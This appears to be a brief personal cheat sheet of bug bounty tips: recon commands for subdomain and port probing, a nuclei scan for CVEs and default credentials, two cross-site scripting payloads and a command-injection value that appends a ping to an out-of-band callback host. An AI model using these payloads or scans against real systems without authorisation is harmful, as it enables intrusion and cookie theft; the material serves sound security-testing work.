# Bug Bounty Personal Tips

``` assetfinder X.com | tee -a /tmp/X.txt```

``` cat /tmp/X.txt | httprobe -p http:81 -p https:8443 -p http:8000 -p http:8001 -p http:8181 -t 40000 | tee -a /tmp/X.txt ```

```  nuclei -l p.txt -t cves/ -t default-credentials/ -o priceline_results.txt -p http://192.168.100.2:1337```

```  : /"><script>alert(document.cookie)</script> ```

``` %27)+O+%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E ```

``` galletita ; ping -c 1 burp.oastify.com ```
